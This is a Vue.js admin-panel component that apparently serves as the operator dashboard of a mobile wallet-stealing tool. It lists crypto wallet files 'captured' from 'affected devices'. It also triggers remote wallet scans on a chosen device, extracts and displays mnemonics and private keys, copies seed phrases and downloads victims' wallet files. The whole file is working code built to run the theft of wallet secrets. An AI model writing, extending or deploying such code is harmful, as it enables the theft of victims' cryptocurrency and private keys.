<template>
  <div class="wallets">
    <!-- Stats -->
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><Wallet /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total_wallets || 0 }}</div>
              <div class="stat-label">Total Wallets</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #e6a23c;">
              <el-icon size="28"><Iphone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ Object.keys(stats.by_device || {}).length }}</div>
              <div class="stat-label">Affected Devices</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><Link /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ Object.keys(stats.by_type || {}).length }}</div>
              <div class="stat-label">Wallet Types</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><Key /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ mnemonicCount }}</div>
              <div class="stat-label">Parsed Mnemonics</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- Supported Wallet Types -->
    <el-card class="supported-wallets-card">
      <template #header>
        <div class="card-header">
          <span>Supported Wallet Types ({{ Object.keys(walletTypes).length }})</span>
          <el-button link @click="toggleSupportedWallets">
            {{ supportedWalletsExpanded ? 'Collapse' : 'Expand' }}
          </el-button>
        </div>
      </template>
      <div v-show="supportedWalletsExpanded" class="supported-wallets-list">
        <el-row :gutter="15">
          <el-col :span="6" v-for="(info, type) in walletTypes" :key="type">
            <div class="supported-wallet-item">
              <div class="wallet-icon">
                <el-icon size="24"><Wallet /></el-icon>
              </div>
              <div class="wallet-content">
                <div class="wallet-name">{{ info.name }}</div>
                <div class="wallet-chain">{{ info.chain }}</div>
                <div class="wallet-bundle">{{ info.bundle_id }}</div>
              </div>
            </div>
          </el-col>
        </el-row>
      </div>
    </el-card>

    <!-- Wallet Type Distribution -->
    <el-card v-if="stats.by_type && Object.keys(stats.by_type).length > 0" class="type-distribution">
      <template #header>
        <span>Wallet Type Distribution</span>
      </template>
      <el-row :gutter="10">
        <el-col :span="3" v-for="(count, type) in stats.by_type" :key="type">
          <el-tag :type="getTagType(type)" size="large">
            {{ getWalletName(type) }}: {{ count }}
          </el-tag>
        </el-col>
      </el-row>
    </el-card>

    <!-- Toolbar -->
    <el-card>
      <div class="toolbar">
        <div class="search-bar">
          <el-input v-model="filters.device_uuid" placeholder="Device UUID" style="width: 250px;" />
          <el-select v-model="filters.wallet_type" placeholder="Wallet Type" style="width: 180px;">
            <el-option label="All" value="" />
            <el-option v-for="(info, type) in walletTypes" :key="type" :label="info.name" :value="type" />
          </el-select>
          <el-button type="primary" @click="loadWallets">Search</el-button>
          <el-button @click="resetFilters">Reset</el-button>
        </div>
        <div class="action-bar">
          <el-button type="success" @click="showScanDialog">Scan Wallets</el-button>
          <el-button type="warning" @click="batchParseMnemonic" :disabled="selectedIds.length === 0">
            Batch Parse Mnemonics
          </el-button>
          <el-button type="danger" @click="batchDelete" :disabled="selectedIds.length === 0">
            Batch Delete
          </el-button>
        </div>
      </div>

      <el-table 
        :data="walletsData" 
        border 
        v-loading="loading"
        @selection-change="handleSelectionChange"
      >
        <el-table-column type="selection" width="55" />
        <el-table-column prop="id" label="ID" width="70" />
        <el-table-column prop="device_uuid" label="Device UUID" width="250" show-overflow-tooltip />
        <el-table-column label="Wallet Type" width="150">
          <template #default="scope">
            <el-tag :type="getTagType(getWalletType(scope.row))">
              {{ getWalletName(getWalletType(scope.row)) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="Blockchain" width="120">
          <template #default="scope">
            {{ getWalletChain(getWalletType(scope.row)) }}
          </template>
        </el-table-column>
        <el-table-column prop="path" label="File Path" show-overflow-tooltip width="200" />
        <el-table-column prop="file_size" label="Size" width="100">
          <template #default="scope">
            {{ formatSize(scope.row.file_size) }}
          </template>
        </el-table-column>
        <el-table-column prop="uploaded_at" label="Captured At" width="180" />
        <el-table-column label="Actions" width="280" fixed="right">
          <template #default="scope">
            <el-button size="small" type="primary" @click="parseMnemonic(scope.row)">
              Parse Mnemonic
            </el-button>
            <el-button size="small" @click="downloadWallet(scope.row)">Download</el-button>
            <el-button size="small" type="danger" @click="deleteWallet(scope.row)">Delete</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>

    <!-- Mnemonic Parser Dialog -->
    <el-dialog title="Wallet Mnemonic Parser" v-model="mnemonicDialogVisible" width="60%">
      <div v-loading="parsing">
        <el-descriptions :column="1" border>
          <el-descriptions-item label="Wallet Type">
            <el-tag :type="getTagType(getWalletType(currentWallet))">
              {{ getWalletName(getWalletType(currentWallet)) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="Blockchain">
            {{ getWalletChain(getWalletType(currentWallet)) }}
          </el-descriptions-item>
          <el-descriptions-item label="Device UUID">
            {{ currentWallet?.device_uuid }}
          </el-descriptions-item>
          <el-descriptions-item label="File Path">
            {{ currentWallet?.path }}
          </el-descriptions-item>
          <el-descriptions-item label="Mnemonic" v-if="mnemonicData.mnemonic">
            <div class="mnemonic-box">
              <el-input 
                :model-value="mnemonicData.mnemonic" 
                type="textarea" 
                :rows="3" 
                readonly 
              />
              <el-button size="small" @click="copyMnemonic" style="margin-top: 5px;">
                Copy Mnemonic
              </el-button>
            </div>
          </el-descriptions-item>
          <el-descriptions-item label="Private Key" v-if="mnemonicData.private_key">
            <el-input 
              :model-value="mnemonicData.private_key" 
              type="textarea" 
              :rows="2" 
              readonly 
            />
          </el-descriptions-item>
          <el-descriptions-item label="Wallet Address" v-if="mnemonicData.address">
            <el-input :model-value="mnemonicData.address" readonly />
          </el-descriptions-item>
        </el-descriptions>

        <div v-if="!mnemonicData.mnemonic && !parsing" class="parse-failed">
          <el-alert title="Auto parsing failed" type="warning" :closable="false">
            <template #default>
              <p>Possible reasons:</p>
              <ul>
                <li>Data is encrypted, needs additional decryption</li>
                <li>Mnemonic stored in Secure Enclave</li>
                <li>File format not supported for auto parsing</li>
              </ul>
              <p>Try viewing raw data for manual analysis</p>
            </template>
          </el-alert>
          <el-button type="primary" @click="showRawData" style="margin-top: 10px;">
            View Raw Data
          </el-button>
        </div>

        <div v-if="showRaw" class="raw-data">
          <h4>Raw Data</h4>
          <pre>{{ mnemonicData.raw_content }}</pre>
        </div>
      </div>
    </el-dialog>

    <!-- Scan Dialog -->
    <el-dialog title="Scan Device Wallets" v-model="scanDialogVisible" width="50%">
      <el-form :model="scanForm" label-width="120px">
        <el-form-item label="Select Device">
          <el-select v-model="scanForm.device_uuid" placeholder="Select a device" style="width: 100%;">
            <el-option 
              v-for="device in devices" 
              :key="device.device_uuid" 
              :label="device.device_uuid" 
              :value="device.device_uuid" 
            />
          </el-select>
        </el-form-item>
        <el-form-item label="Wallet Types">
          <el-select v-model="scanForm.wallet_types" multiple placeholder="Select wallet types to scan" style="width: 100%;">
            <el-option 
              v-for="(info, type) in walletTypes" 
              :key="type" 
              :label="info.name" 
              :value="type" 
            />
          </el-select>
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="scanDialogVisible = false">Cancel</el-button>
        <el-button type="primary" @click="startScan" :loading="scanning">
          Start Scan
        </el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import axios from '../utils/axios'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Wallet, Iphone, Link, Key } from '@element-plus/icons-vue'
import { formatBytes, formatDateTime } from '../utils'

const walletsData = ref([])
const loading = ref(false)
const walletTypes = ref({})
const stats = ref({})
const mnemonicCount = ref(0)
const selectedIds = ref([])
const devices = ref([])
const supportedWalletsExpanded = ref(false)

const filters = reactive({
  device_uuid: '',
  wallet_type: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

// Mnemonic parsing
const mnemonicDialogVisible = ref(false)
const parsing = ref(false)
const currentWallet = ref(null)
const mnemonicData = reactive({
  mnemonic: '',
  private_key: '',
  address: '',
  raw_content: ''
})
const showRaw = ref(false)

// Scan
const scanDialogVisible = ref(false)
const scanning = ref(false)
const scanForm = reactive({
  device_uuid: '',
  wallet_types: []
})

function formatSize(size) {
  return formatBytes(size)
}

function getWalletType(row) {
  if (!row.description) return 'unknown'
  const desc = row.description.toLowerCase()
  for (const type of Object.keys(walletTypes.value)) {
    if (desc.includes(type)) return type
  }
  return 'unknown'
}

function getWalletName(type) {
  return walletTypes.value[type]?.name || type
}

function getWalletChain(type) {
  return walletTypes.value[type]?.chain || '-'
}

function getTagType(type) {
  const types = {
    'metamask': 'warning',
    'trust': 'success',
    'coinbase': 'primary',
    'imtoken': 'danger',
    'tokenpocket': 'info',
    'phantom': 'danger'
  }
  return types[type] || 'info'
}

async function loadWalletTypes() {
  try {
    const response = await axios.get('/api/wallets/types')
    walletTypes.value = response.data
  } catch (error) {
    console.error('Failed to load wallet types:', error)
  }
}

async function loadStats() {
  try {
    const response = await axios.get('/api/wallets/stats')
    stats.value = response.data
  } catch (error) {
    console.error('Failed to load stats:', error)
  }
}

async function loadWallets() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.wallet_type) params.append('wallet_type', filters.wallet_type)
    
    const response = await axios.get(`/api/wallets?${params}`)
    walletsData.value = response.data.items
    pagination.total = response.data.total
  } catch (error) {
    console.error('Failed to load data:', error)
  } finally {
    loading.value = false
  }
}

function toggleSupportedWallets() {
  supportedWalletsExpanded.value = !supportedWalletsExpanded.value
}

async function loadDevices() {
  try {
    const response = await axios.get('/api/devices?limit=100')
    devices.value = Array.isArray(response.data) ? response.data : (response.data.items || [])
  } catch (error) {
    console.error('Failed to load devices:', error)
  }
}

function handleSelectionChange(selection) {
  selectedIds.value = selection.map(item => item.id)
}

async function parseMnemonic(row) {
  currentWallet.value = row
  mnemonicDialogVisible.value = true
  parsing.value = true
  showRaw.value = false
  mnemonicData.mnemonic = ''
  mnemonicData.private_key = ''
  mnemonicData.address = ''
  mnemonicData.raw_content = ''
  
  try {
    const response = await axios.get(`/api/wallets/mnemonic/${row.id}`)
    Object.assign(mnemonicData, response.data)
    if (mnemonicData.mnemonic) {
      mnemonicCount.value++
    }
  } catch (error) {
    ElMessage.error('Parse failed: ' + (error.response?.data?.detail || error.message))
  } finally {
    parsing.value = false
  }
}

async function batchParseMnemonic() {
  for (const id of selectedIds.value) {
    const wallet = walletsData.value.find(w => w.id === id)
    if (wallet) {
      await parseMnemonic(wallet)
      mnemonicDialogVisible.value = false
    }
  }
  ElMessage.success(`Parsed ${selectedIds.value.length} wallets`)
}

function showRawData() {
  showRaw.value = !showRaw.value
}

function copyMnemonic() {
  navigator.clipboard.writeText(mnemonicData.mnemonic)
  ElMessage.success('Mnemonic copied to clipboard')
}

async function downloadWallet(row) {
  try {
    const response = await axios.get(`/api/wallets/${row.id}/download`, { responseType: 'blob' })
    const url = window.URL.createObjectURL(new Blob([response.data]))
    const link = document.createElement('a')
    link.href = url
    link.setAttribute('download', row.path.split('/').pop() || `wallet_${row.id}.dat`)
    document.body.appendChild(link)
    link.click()
    link.remove()
  } catch (error) {
    ElMessage.error('Download failed')
  }
}

async function deleteWallet(row) {
  try {
    await ElMessageBox.confirm('Delete this wallet data?', 'Warning', { type: 'warning' })
    await axios.delete(`/api/wallets/${row.id}`)
    ElMessage.success('Deleted')
    loadWallets()
    loadStats()
  } catch (error) {
    if (error !== 'cancel') {
      ElMessage.error('Delete failed')
    }
  }
}

async function batchDelete() {
  try {
    await ElMessageBox.confirm(`Delete ${selectedIds.value.length} selected records?`, 'Warning', { type: 'warning' })
    for (const id of selectedIds.value) {
      await axios.delete(`/api/wallets/${id}`)
    }
    ElMessage.success('Batch delete successful')
    loadWallets()
    loadStats()
  } catch (error) {
    if (error !== 'cancel') {
      ElMessage.error('Delete failed')
    }
  }
}

function showScanDialog() {
  scanForm.device_uuid = ''
  scanForm.wallet_types = []
  loadDevices()
  scanDialogVisible.value = true
}

async function startScan() {
  if (!scanForm.device_uuid) {
    ElMessage.warning('Please select a device')
    return
  }
  
  scanning.value = true
  try {
    const response = await axios.post(`/api/wallets/scan?device_uuid=${scanForm.device_uuid}`)
    ElMessage.success(response.data.message)
    scanDialogVisible.value = false
  } catch (error) {
    ElMessage.error('Scan failed: ' + (error.response?.data?.detail || error.message))
  } finally {
    scanning.value = false
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.wallet_type = ''
  loadWallets()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadWallets()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadWallets()
}

onMounted(() => {
  loadWalletTypes()
  loadStats()
  loadWallets()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.supported-wallets-card {
  margin-bottom: 15px;
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.supported-wallets-list {
  margin-top: 10px;
}

.supported-wallet-item {
  background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
  border-radius: 12px;
  padding: 20px;
  color: #fff;
  margin-bottom: 15px;
  display: flex;
  align-items: center;
  gap: 15px;
  transition: transform 0.3s, box-shadow 0.3s;
}

.supported-wallet-item:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 25px rgba(17, 153, 142, 0.4);
}

.wallet-icon {
  width: 48px;
  height: 48px;
  border-radius: 50%;
  background: rgba(255, 255, 255, 0.2);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.wallet-content {
  flex: 1;
}

.wallet-name {
  font-size: 16px;
  font-weight: bold;
  margin-bottom: 4px;
}

.wallet-chain {
  font-size: 13px;
  opacity: 0.9;
  margin-bottom: 4px;
}

.wallet-bundle {
  font-size: 11px;
  opacity: 0.7;
  font-family: monospace;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.type-distribution {
  margin-bottom: 15px;
}

.toolbar {
  display: flex;
  justify-content: space-between;
  margin-bottom: 15px;
  flex-wrap: wrap;
  gap: 10px;
}

.search-bar, .action-bar {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}

.mnemonic-box {
  width: 100%;
}

.parse-failed {
  margin-top: 15px;
}

.raw-data {
  margin-top: 15px;
}

.raw-data pre {
  background: #f5f5f5;
  padding: 10px;
  border-radius: 4px;
  max-height: 300px;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-all;
}
</style>
